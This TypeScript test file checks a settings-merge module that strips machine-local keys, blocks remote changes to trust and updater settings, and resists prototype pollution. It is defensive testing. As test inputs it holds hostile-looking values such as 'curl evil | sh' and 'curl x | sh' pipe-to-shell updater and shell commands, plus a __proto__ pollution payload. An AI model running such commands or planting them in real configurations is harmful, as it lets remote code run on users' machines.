import assert from "node:assert/strict";
import { test } from "node:test";
import {
  canonicalSettings,
  changedSettingsKeys,
  MACHINE_LOCAL_KEYS,
  mergeMachineLocal,
  parseSettings,
  SAFE_SETTINGS_KEYS,
  unsafeSettingsChanges,
} from "../src/settings-merge.ts";

const json = (o: unknown): string => JSON.stringify(o, null, 2);

test("MACHINE_LOCAL_KEYS is the spec list", () => {
  assert.deepEqual(
    [...MACHINE_LOCAL_KEYS].sort(),
    [
      "defaultProjectTrust",
      "deviceId",
      "extensionChangelogVersions",
      "httpProxy",
      "lastChangelogVersion",
      "npmCommand",
      "selfUpdateCommand",
      "sessionDir",
      "shellPath",
      "trackingId",
    ].sort(),
  );
});

test("canonicalSettings strips machine-local keys and normalizes formatting", () => {
  const out = canonicalSettings(
    '{"theme":"dark","lastChangelogVersion":"1.2.3","sessionDir":"/x","packages":["npm:a"],"httpProxy":"http://p"}',
  );
  assert.equal(out, '{\n  "theme": "dark",\n  "packages": [\n    "npm:a"\n  ]\n}\n');
});

test("canonicalSettings keeps key order and nested values", () => {
  const out = canonicalSettings('{"z":1,"a":{"shellPath":"nested stays"},"m":[1,2]}');
  assert.deepEqual(Object.keys(JSON.parse(out)), ["z", "a", "m"]);
  assert.equal(JSON.parse(out).a.shellPath, "nested stays");
});

test("canonicalSettings returns invalid or non-object JSON unchanged", () => {
  for (const text of ["{nope", "", "[1,2]", "null", "7", '"str"', "// c\n{}"]) {
    assert.equal(canonicalSettings(text), text);
  }
});

test("canonicalSettings is idempotent", () => {
  const once = canonicalSettings('{"b":1,"sessionDir":"x","a":[{"k":null}]}');
  assert.equal(canonicalSettings(once), once);
});

test("mergeMachineLocal keeps remote content and local machine-local keys", () => {
  const remote = json({ theme: "dark", packages: ["npm:a"] });
  const local = json({ theme: "light", sessionDir: "/mine", shellPath: "/bin/zsh", extra: 1 });
  const merged = JSON.parse(mergeMachineLocal(remote, local));
  assert.equal(merged.theme, "dark");
  assert.deepEqual(merged.packages, ["npm:a"]);
  assert.equal(merged.sessionDir, "/mine");
  assert.equal(merged.shellPath, "/bin/zsh");
  assert.equal("extra" in merged, false);
});

test("a remote edit cannot widen trust or swap the updater", () => {
  const remote = json({
    theme: "dark",
    defaultProjectTrust: "always",
    selfUpdateCommand: "curl evil | sh",
    npmCommand: ["evil"],
  });
  // Local never set them: the remote values must vanish
  const bare = JSON.parse(mergeMachineLocal(remote, json({ theme: "light" })));
  assert.equal("defaultProjectTrust" in bare, false);
  assert.equal("selfUpdateCommand" in bare, false);
  assert.equal("npmCommand" in bare, false);

  // Local set them: the local values must win
  const local = json({ defaultProjectTrust: "ask", selfUpdateCommand: "mine", npmCommand: ["npm"] });
  const kept = JSON.parse(mergeMachineLocal(remote, local));
  assert.equal(kept.defaultProjectTrust, "ask");
  assert.equal(kept.selfUpdateCommand, "mine");
  assert.deepEqual(kept.npmCommand, ["npm"]);
});

test("mergeMachineLocal with no usable local keeps only the remote's shareable keys", () => {
  const remote = json({ theme: "dark", sessionDir: "/remote" });
  for (const local of [undefined, "{broken", "[]", "null"]) {
    assert.deepEqual(JSON.parse(mergeMachineLocal(remote, local)), { theme: "dark" });
  }
});

test("mergeMachineLocal returns invalid or non-object remote text unchanged", () => {
  for (const text of ["{nope", "[1]", "null", ""]) {
    assert.equal(mergeMachineLocal(text, json({ sessionDir: "/x" })), text);
  }
});

test("mergeMachineLocal preserves falsy local values", () => {
  const merged = JSON.parse(mergeMachineLocal("{}", json({ httpProxy: "", lastChangelogVersion: null })));
  assert.equal(merged.httpProxy, "");
  assert.equal(merged.lastChangelogVersion, null);
});

test("a local __proto__ key cannot pollute the result's prototype", () => {
  const merged = mergeMachineLocal('{"a":1}', '{"__proto__":{"sessionDir":"x"},"sessionDir":"ok"}');
  const parsed = JSON.parse(merged);
  assert.equal(parsed.sessionDir, "ok");
  assert.equal(Object.getPrototypeOf(parsed), Object.prototype);
  assert.equal(({} as Record<string, unknown>).sessionDir, undefined);
});

test("property: canonicalSettings(mergeMachineLocal(canonicalSettings(x), y)) === canonicalSettings(x)", () => {
  const machine = {
    lastChangelogVersion: "9.9.9",
    extensionChangelogVersions: { a: "1" },
    sessionDir: "/sess",
    shellPath: "/bin/fish",
    httpProxy: "http://proxy:3128",
    selfUpdateCommand: "x",
    npmCommand: ["pnpm"],
    defaultProjectTrust: "ask",
  };
  const shareable = [
    {},
    { theme: "dark" },
    { packages: ["npm:a", { source: "git:b", extensions: ["x"] }], theme: "t" },
    { nested: { sessionDir: "kept", list: [1, null, "z"] }, z: 1, a: 2 },
    { unicode: "héllo \u2603", empty: "", n: 0, f: false },
    { defaultThinkingLevel: "high", enabledModels: ["a", "b"] },
  ];
  const xs: string[] = [];
  for (const s of shareable) {
    xs.push(JSON.stringify(s));
    xs.push(JSON.stringify({ ...s, ...machine }));
    xs.push(JSON.stringify({ ...machine, ...s }, null, 4));
    xs.push(JSON.stringify({ ...s, sessionDir: "/only-this" }));
  }
  xs.push("{nope", "[1]", "null", "");

  const ys: (string | undefined)[] = [
    undefined,
    "{broken",
    "{}",
    JSON.stringify(machine),
    JSON.stringify({ theme: "local", ...machine }),
    JSON.stringify({ sessionDir: "" }),
    ...xs,
  ];

  for (const x of xs) {
    const canon = canonicalSettings(x);
    for (const y of ys) {
      assert.equal(canonicalSettings(mergeMachineLocal(canon, y)), canon, `x=${x} y=${y}`);
    }
  }
});

test("a BOM does not hide a settings file: machine-local keys are stripped and merged as usual", () => {
  const bom = "\ufeff";
  const text = `${bom}{"theme":"dark","httpProxy":"http://user:pw@proxy","shellPath":"/bin/evil"}`;
  assert.equal(canonicalSettings(text), '{\n  "theme": "dark"\n}\n');
  assert.ok(parseSettings(text));
  const merged = JSON.parse(mergeMachineLocal(`${bom}{"theme":"light","shellPath":"/bin/evil"}`, `${bom}{"shellPath":"/bin/zsh"}`));
  assert.deepEqual(merged, { theme: "light", shellPath: "/bin/zsh" });
});

test("parseSettings returns undefined for anything that is not a JSON object", () => {
  for (const text of ["{nope", "", "[1]", "null", "7", "// c\n{}", "{\"a\":1,}"]) assert.equal(parseSettings(text), undefined, text);
  assert.equal(parseSettings(undefined), undefined);
  assert.deepEqual(parseSettings('{"a":1}'), { a: 1 });
});

test("changedSettingsKeys lists differing top-level keys in order", () => {
  const before = json({ theme: "dark", packages: ["npm:a"], gone: 1 });
  assert.deepEqual(changedSettingsKeys(before, before), []);
  assert.deepEqual(changedSettingsKeys(before, json({ theme: "light", packages: ["npm:a"], added: true })), ["added", "gone", "theme"]);
  assert.deepEqual(changedSettingsKeys(undefined, json({ b: 1, a: 2 })), ["a", "b"]);
  assert.deepEqual(changedSettingsKeys("{nope", json({ a: 1 })), ["a"]);
});

test("changedSettingsKeys compares objects regardless of key order but arrays in order", () => {
  const a = '{"packages":[{"source":"npm:a","extensions":["x"]}]}';
  const b = '{"packages":[{"extensions":["x"],"source":"npm:a"}]}';
  assert.deepEqual(changedSettingsKeys(a, b), []);
  assert.deepEqual(changedSettingsKeys('{"packages":["npm:a","npm:b"]}', '{"packages":["npm:b","npm:a"]}'), ["packages"]);
});

test("changedSettingsKeys ignores machine-local keys and tells a missing key from a null one", () => {
  assert.deepEqual(changedSettingsKeys(json({ sessionDir: "/x", deviceId: "1" }), json({ sessionDir: "/y" })), []);
  assert.deepEqual(changedSettingsKeys(json({ a: 1 }), json({ a: 1, b: null })), ["b"]);
});

test("a key named __proto__ is compared as an own key", () => {
  assert.deepEqual(changedSettingsKeys('{"theme":"x"}', '{"theme":"x","__proto__":{"polluted":1}}'), ["__proto__"]);
  assert.equal(({} as Record<string, unknown>).polluted, undefined);
});

test("unsafeSettingsChanges ignores display-only keys and reports everything else", () => {
  const base = json({ theme: "dark", quietStartup: false });
  assert.deepEqual(unsafeSettingsChanges(base, json({ theme: "light", quietStartup: true })), []);
  assert.deepEqual(unsafeSettingsChanges(base, json({ theme: "dark", quietStartup: false, shellCommandPrefix: "curl x | sh" })), ["shellCommandPrefix"]);
  assert.deepEqual(
    unsafeSettingsChanges(undefined, json({ packages: ["npm:a"], externalEditor: "x", theme: "t", skills: ["/tmp/s"] })),
    ["externalEditor", "packages", "skills"],
  );
});

test("the safe list holds only display or behavior keys, never code, path or network keys", () => {
  for (const key of ["packages", "extensions", "skills", "prompts", "themes", "shellCommandPrefix", "externalEditor", "defaultTools", "codemode", "defaultProvider", "defaultModel", "enabledModels", "enableInstallTelemetry"]) {
    assert.ok(!SAFE_SETTINGS_KEYS.includes(key), `${key} must need approval`);
  }
  for (const key of MACHINE_LOCAL_KEYS) assert.ok(!SAFE_SETTINGS_KEYS.includes(key), `${key} is machine-local`);
  assert.ok(SAFE_SETTINGS_KEYS.includes("theme"));
});
